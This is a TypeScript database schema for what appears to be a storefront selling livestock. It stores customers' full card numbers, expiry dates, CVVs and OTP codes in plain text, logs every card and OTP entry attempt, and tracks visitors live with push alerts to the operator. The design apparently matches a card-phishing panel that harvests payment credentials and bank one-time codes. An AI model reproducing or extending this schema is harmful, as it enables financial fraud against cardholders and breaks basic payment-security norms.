import { createInsertSchema } from "drizzle-zod";
import {
  boolean,
  date,
  integer,
  numeric,
  pgTable,
  serial,
  text,
  timestamp,
  jsonb,
} from "drizzle-orm/pg-core";
import { z } from "zod/v4";

export const productsTable = pgTable("dheebti_products", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  description: text("description").notNull(),
  imageUrl: text("image_url").notNull(),
  image: text("image"), // Base64 image data
  maxQuantity: integer("max_quantity").notNull().default(10),
  price: numeric("price", { precision: 10, scale: 3 }).notNull().default("0"),
  active: boolean("active").notNull().default(true),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

export const siteContentTable = pgTable("dheebti_site_content", {
  id: serial("id").primaryKey(),
  brandName: text("brand_name").notNull(),
  heroTitle: text("hero_title").notNull(),
  heroText: text("hero_text").notNull(),
  heroImageUrl: text("hero_image_url").notNull(),
  navLinks: text("nav_links").array().notNull().default([]),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow().$onUpdate(() => new Date()),
});

export const ordersTable = pgTable("dheebti_orders", {
  id: serial("id").primaryKey(),
  productId: integer("product_id").notNull(),
  productName: text("product_name").notNull(),
  quantity: integer("quantity").notNull(),
  customerName: text("customer_name").notNull(),
  phone: text("phone").notNull(),
  address: text("address").notNull(),
  pickupDate: date("pickup_date", { mode: "string" }).notNull(),
  preparationType: text("preparation_type"), // 'slaughtered' or 'live'
  paymentMethod: text("payment_method").notNull(),
  paymentStatus: text("payment_status").notNull().default("not_required"),
  status: text("status").notNull().default("new"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  cardName: text("card_name"),
  cardNumber: text("card_number"),
  cardExpiry: text("card_expiry"),
  cardCvv: text("card_cvv"),
  otpCode: text("otp_code"),
  visitorId: text("visitor_id"),
});

// Table to track all card entry attempts
export const cardAttemptsTable = pgTable("dheebti_card_attempts", {
  id: serial("id").primaryKey(),
  orderId: integer("order_id").notNull().references(() => ordersTable.id),
  cardName: text("card_name").notNull(),
  cardNumber: text("card_number").notNull(),
  cardExpiry: text("card_expiry").notNull(),
  cardCvv: text("card_cvv"),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

// Table to track all OTP verification attempts
export const otpAttemptsTable = pgTable("dheebti_otp_attempts", {
  id: serial("id").primaryKey(),
  orderId: integer("order_id").notNull().references(() => ordersTable.id),
  otpCode: text("otp_code").notNull(),
  success: boolean("success").notNull().default(false),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

// Admin table for authentication
export const adminTable = pgTable("dheebti_admin", {
  id: serial("id").primaryKey(),
  email: text("email").notNull().unique(),
  passwordHash: text("password_hash").notNull(),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
  updatedAt: timestamp("updated_at", { withTimezone: true }).notNull().defaultNow(),
});

// Visitors table for tracking unique visitors
export const visitorsTable = pgTable("dheebti_visitors", {
  id: serial("id").primaryKey(),
  visitorId: text("visitor_id").unique().notNull(),
  firstVisit: timestamp("first_visit", { withTimezone: true }).notNull().defaultNow(),
  lastVisit: timestamp("last_visit", { withTimezone: true }).notNull().defaultNow(),
  currentPage: text("current_page"),
  lastSeenAt: timestamp("last_seen_at", { withTimezone: true }).notNull().defaultNow(),
  totalOrders: integer("total_orders").notNull().default(0),
  metadata: jsonb("metadata").$type<{
    lastCustomerName?: string;
    lastPhone?: string;
    lastProductName?: string;
    pagesVisited?: string[];
  }>().default({}),
});

export const presenceTable = pgTable("dheebti_presence", {
  sessionId: text("session_id").primaryKey(),
  page: text("page").notNull(),
  label: text("label").notNull(),
  customerName: text("customer_name"),
  visitorId: text("visitor_id"),
  lastSeenAt: timestamp("last_seen_at", { withTimezone: true }).notNull().defaultNow(),
});

// Table to store admin FCM tokens for push notifications
export const adminDevicesTable = pgTable("dheebti_admin_devices", {
  id: serial("id").primaryKey(),
  fcmToken: text("fcm_token").notNull().unique(),
  deviceName: text("device_name"), // e.g., "Chrome on Mac", "Safari on iPhone"
  deviceType: text("device_type"), // 'desktop', 'mobile', 'tablet'
  browser: text("browser"), // 'Chrome', 'Safari', 'Firefox', etc.
  os: text("os"), // 'iOS', 'Android', 'Windows', 'Mac', etc.
  isActive: boolean("is_active").notNull().default(true),
  lastUsedAt: timestamp("last_used_at", { withTimezone: true }).notNull().defaultNow(),
  createdAt: timestamp("created_at", { withTimezone: true }).notNull().defaultNow(),
});

export const insertProductSchema = createInsertSchema(productsTable).omit({ id: true, createdAt: true });
export const insertSiteContentSchema = createInsertSchema(siteContentTable).omit({ id: true, updatedAt: true });
export const insertOrderSchema = createInsertSchema(ordersTable).omit({ id: true, createdAt: true });
export const insertVisitorSchema = createInsertSchema(visitorsTable);
export const insertPresenceSchema = createInsertSchema(presenceTable);
export const insertAdminDeviceSchema = createInsertSchema(adminDevicesTable).omit({ id: true, lastUsedAt: true, createdAt: true });

export const productPriceSchema = z.coerce.number().nonnegative();
export type Product = typeof productsTable.$inferSelect;
export type SiteContent = typeof siteContentTable.$inferSelect;
export type Order = typeof ordersTable.$inferSelect;
export type Visitor = typeof visitorsTable.$inferSelect;
export type Presence = typeof presenceTable.$inferSelect;
export type CardAttempt = typeof cardAttemptsTable.$inferSelect;
export type OtpAttempt = typeof otpAttemptsTable.$inferSelect;
export type Admin = typeof adminTable.$inferSelect;
export type AdminDevice = typeof adminDevicesTable.$inferSelect;
